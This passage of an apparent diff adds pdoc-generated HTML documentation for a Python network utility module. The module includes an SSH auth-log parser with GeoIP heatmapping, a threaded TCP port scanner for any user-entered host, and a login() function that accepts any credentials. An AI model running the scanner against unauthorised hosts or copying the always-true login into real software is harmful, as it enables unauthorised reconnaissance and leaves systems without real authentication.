+            # get timestamps Feb 22 08:48:13 ubinet sshd[22468]: Failed password for root from 65.207.23.201 port 32839 ssh2
+            # timestamp = line[:15]
+
+            # ips=[]
+            ips_timestamp = []
+            for x in ssh_log:
+                if x:
+                    match = p.search(x)
+                    if match:
+                        ip = match.group(3)
+                        timestamp = match.group(1)
+
+                        is_private = ipaddress.ip_address(ip).is_private
+
+                        if is_private:
+                            pass
+                        else:
+                            # ips.append(ip)
+                            ips_timestamp.append((ip, timestamp))
+
+            # get ip coordinates with geoip...
+
+            coords = []
+
+            # GeoLite2-City.mmdb
+            client = geoip2.database.Reader(&#39;GeoLite2-City.mmdb&#39;)
+            # $ curl ipinfo.io/ip
+
+            # removing duplicates
+            # ips = list(set(ips))
+
+            ip_country = []
+
+            print(&#34;Calculating...&#34;)
+
+            for ip in ips_timestamp:
+
+                response = client.city(str(ip[0]))
+
+                lat = response.location.latitude
+                lon = response.location.longitude
+                ip_country.append(
+                    (response.country.name, str(ip[0]), str(ip[1])))
+                coords.append((lat, lon))
+
+            # generate and save heatmap
+            m = folium.Map(tiles=&#34;OpenStreetMap&#34;,
+                           location=[20, 10], zoom_start=2)
+            # mess around with these values to change how the heatmap looks
+            HeatMap(data=coords, radius=15, blur=20, max_zoom=2).add_to(m)
+            m.save(&#34;auth_log_heatmap_trb&#34;)
+            print(&#39;\nDone. Heatmap saved as auth_log_heatmap_trb.&#39;)
+
+            # Generate a pdf
+            generate_pdf(&#34;ssh_log_info.pdf&#34;, ip_country,
+                         &#34;SSH password failed attempts information&#34;)
+
+        elif answer == &#34;3&#34;:
+            break
+        else:
+            print(&#34;Choose a NUMBER between 1 and 3.&#34;)</code></pre>
+</details>
+</dd>
+<dt id="app_lpd.login"><code class="name flex">
+<span>def <span class="ident">login</span></span>(<span>)</span>
+</code></dt>
+<dd>
+<div class="desc"><h2 id="parameters">Parameters</h2>
+<dl>
+<dt><strong><code>user</code></strong> :&ensp;<code>string</code></dt>
+<dd>&nbsp;</dd>
+<dt><strong><code>passwd</code></strong> :&ensp;<code>string</code></dt>
+<dd>The password inputted.</dd>
+</dl>
+<h2 id="returns">Returns</h2>
+<dl>
+<dt><strong><code>is_authenticated</code></strong> :&ensp;<code>boolean</code></dt>
+<dd>Returns True and the user name.</dd>
+</dl></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">def login():
+    &#34;&#34;&#34;
+    
+    Parameters
+    -------
+    user : string
+    passwd : string
+        The password inputted.
+
+    Returns
+    -------
+    is_authenticated : boolean
+        Returns True and the user name.
+
+    &#34;&#34;&#34;
+    is_allowed = True
+    user = input(&#34;Enter the username: &#34;)
+    passwd = input(&#34;Enter the password: &#34;)
+
+    return is_allowed, user</code></pre>
+</details>
+</dd>
+<dt id="app_lpd.port_scanner"><code class="name flex">
+<span>def <span class="ident">port_scanner</span></span>(<span>)</span>
+</code></dt>
+<dd>
+<div class="desc"><p>This function aims to perform a port scan on a specific target.
+It uses Python's socket module to connect to different ports on
+the target and check if they are open or closed.
+It starts by asking the user to enter the target to be scanned and
+gets the IP address of that target.
+Then it defines a function called "portscan" that tries to connect
+to a specific port on the target and,
+if the connection is successful, prints out the open port. If the
+connection is not successful, the function passes.
+It also defines a function called "threader" that creates multiple
+threads to perform the port scan in parallel, which speeds up the process.
+It uses a queue to store the ports to be scanned and measures the time spent on the scan.</p>
+<pre><code>Parameters
+-------
+target : string
+
+Returns
+-------
+open ports in target and Time taken
+</code></pre></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">def port_scanner():
+    &#34;&#34;&#34;
+    This function aims to perform a port scan on a specific target.
+    It uses Python&#39;s socket module to connect to different ports on
+    the target and check if they are open or closed.
+    It starts by asking the user to enter the target to be scanned and
+    gets the IP address of that target.
+    Then it defines a function called &#34;portscan&#34; that tries to connect
+    to a specific port on the target and,
+    if the connection is successful, prints out the open port. If the
+    connection is not successful, the function passes.
+    It also defines a function called &#34;threader&#34; that creates multiple
+    threads to perform the port scan in parallel, which speeds up the process.
+    It uses a queue to store the ports to be scanned and measures the time spent on the scan.
+
+
+        Parameters
+        -------
+        target : string
+
+        Returns
+        -------
+        open ports in target and Time taken
+    &#34;&#34;&#34;
+    socket.setdefaulttimeout(0.25)
+    print_lock = threading.Lock()
+
+    target = input(&#39;Enter the host to be scanned: &#39;)
+    t_IP = socket.gethostbyname(target)
+    print(&#39;Starting scan on host: &#39;, t_IP)
+
+    def portscan(port):
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        try:
+            con = s.connect((t_IP, port))
+            with print_lock:
+                print(port, &#39;is open&#39;)
+            con.close()
+        except:
+            pass
+
+    def threader():
+        while True:
+            worker = q.get()
+            portscan(worker)
+            q.task_done()
+
+    q = Queue()
+    startTime = time.time()
+
+    for x in range(100):
+        t = threading.Thread(target=threader)
+        t.daemon = True
+        t.start()
+
+    for worker in range(1, 8080):
+        q.put(worker)
+
+    q.join()
+    print(&#39;Time taken:&#39;, time.time() - startTime)</code></pre>
+</details>
+</dd>
+</dl>
+</section>
+<section>
+</section>
+</article>
+<nav id="sidebar">
+<h1>Index</h1>
+<div class="toc">
+<ul></ul>
+</div>
+<ul id="index">
+<li><h3><a href="#header-functions">Functions</a></h3>
+<ul class="two-column">
+<li><code><a title="app_lpd.active_connections" href="#app_lpd.active_connections">active_connections</a></code></li>
+<li><code><a title="app_lpd.authentication" href="#app_lpd.authentication">authentication</a></code></li>
+<li><code><a title="app_lpd.chat" href="#app_lpd.chat">chat</a></code></li>
+<li><code><a title="app_lpd.flood" href="#app_lpd.flood">flood</a></code></li>
+<li><code><a title="app_lpd.generate_pdf" href="#app_lpd.generate_pdf">generate_pdf</a></code></li>
+<li><code><a title="app_lpd.log_manager" href="#app_lpd.log_manager">log_manager</a></code></li>
+<li><code><a title="app_lpd.login" href="#app_lpd.login">login</a></code></li>
+<li><code><a title="app_lpd.port_scanner" href="#app_lpd.port_scanner">port_scanner</a></code></li>
+</ul>
+</li>
+</ul>
+</nav>
+</main>
+<footer id="footer">
+<p>Generated by <a href="https://pdoc3.github.io/pdoc" title="pdoc: Python API documentation generator"><cite>pdoc</cite> 0.10.0</a>.</p>
+</footer>
+</body>
+</html>
